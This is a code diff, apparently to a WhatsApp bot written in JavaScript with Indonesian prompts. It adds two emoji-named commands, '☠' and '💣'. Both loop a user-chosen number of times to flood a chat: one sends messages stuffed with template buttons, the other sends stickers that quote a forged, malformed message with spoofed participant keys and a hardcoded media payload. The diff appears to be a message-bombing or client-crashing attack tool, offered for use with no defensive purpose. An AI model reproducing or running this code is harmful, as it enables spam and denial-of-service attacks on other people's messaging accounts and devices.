@@ -195,21 +195,70 @@ user.afkReason = ''
 
 switch(command) {
 
-case 'canb': {
+case '☠': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+cannx = `By Carosatzx`
+for (let i = 0; i < jumlah; i++) {
 cann.sendMessage(m.chat, { text: '', templateButtons: [
-{ callButton: { displayText: `p`, phoneNumber: ''}},
-{ callButton: { displayText: `p`, phoneNumber: ''}},
+{ callButton: { displayText: ``, phoneNumber: ''}},
+{ callButton: { displayText: ``, phoneNumber: ''}},
 { urlButton: { displayText: `TheCarosatzx`, url: 'https://wa.me/573177111111'}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
-{ quickReplyButton: { displayText: `p`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
 ]})
+}
+}
+break
+
+case '💣': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+cannx = `By Carosatzx`
+for (let i = 0; i < jumlah; i++) {
+client.sendMessage(m.chat, {sticker: fs.readFileSync('./src/stick.webp')},{quoted: {
+key: { 
+fromMe: true, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+key: { 
+fromMe: true, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+key: { 
+fromMe: true, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+"message": {
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "7774",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": false,
+}
+}
+}})
+}
 }
 break
 
